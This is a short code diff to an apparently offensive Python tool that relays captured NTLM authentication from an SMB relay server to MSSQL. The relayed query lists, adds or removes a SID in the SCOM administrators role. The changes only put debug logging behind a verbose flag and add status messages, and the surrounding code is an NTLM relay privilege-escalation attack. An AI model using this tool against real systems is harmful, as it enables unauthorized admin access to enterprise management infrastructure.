@@ -50,12 +50,14 @@ class MSSQLSCOMRELAY:
         # Set protocol clients and attacks - this is what ntlmrelayx does!
         config.setProtocolClients(PROTOCOL_CLIENTS)
         config.setAttacks(PROTOCOL_ATTACKS)
-        logger.info(f"[DEBUG] Registered protocol clients: {list(PROTOCOL_CLIENTS.keys())}")
-        logger.info(f"[DEBUG] Registered attacks: {list(PROTOCOL_ATTACKS.keys())}")
+        if self.verbose:
+            logger.info(f"[DEBUG] Registered protocol clients: {list(PROTOCOL_CLIENTS.keys())}")
+            logger.info(f"[DEBUG] Registered attacks: {list(PROTOCOL_ATTACKS.keys())}")
         
         # Set the MSSQL query - this is how ntlmrelayx does it with -q flag
         config.setMSSQLOptions([self.query])
-        logger.info(f"[DEBUG] Set MSSQL query via setMSSQLOptions: {self.query}")
+        if self.verbose:
+            logger.info(f"[DEBUG] Set MSSQL query via setMSSQLOptions: {self.query}")
         
         config.setListeningPort(port)
         config.setInterfaceIp(interface)
@@ -64,7 +66,8 @@ class MSSQLSCOMRELAY:
         config.setOutputFile(None)
 
         self.server = SMBRelayServer(config)
-        logger.info("[DEBUG] SMBRelayServer created successfully")
+        if self.verbose:
+            logger.info("[DEBUG] SMBRelayServer created successfully")
 
     def convert_string_sid(self, sid):
         """Convert string SID to hex format for SQL query"""
@@ -118,16 +121,27 @@ class MSSQLSCOMRELAY:
         logger.info(f"Query ready: {self.query}")
 
         try:
-            logger.info("[DEBUG] About to call self.server.start()...")
+            if self.verbose:
+                logger.info("[DEBUG] About to call self.server.start()...")
             self.server.start()
-            logger.info("[DEBUG] self.server.start() completed")
+            if self.verbose:
+                logger.info("[DEBUG] self.server.start() completed")
         except Exception as e:
             logger.info(f"[ERROR] Exception starting server: {e}")
             import traceback
             logger.info(f"[ERROR] Traceback:\n{traceback.format_exc()}")
             return
 
-        logger.info("[DEBUG] Entering main loop...")
+        if self.verbose:
+            logger.info("[DEBUG] Entering main loop...")
+        
+        # Print helpful message based on operation mode
+        if self.operation_mode == 'list':
+            logger.info("[*] Relay will list SCOM admin role members when authentication is received")
+        elif self.operation_mode == 'delete':
+            logger.info("[*] Relay will remove SID from SCOM admin role when authentication is received")
+        else:
+            logger.info("[*] Relay will add SID to SCOM admin role when authentication is received")
         try:
             while True:
                 time.sleep(0.1)
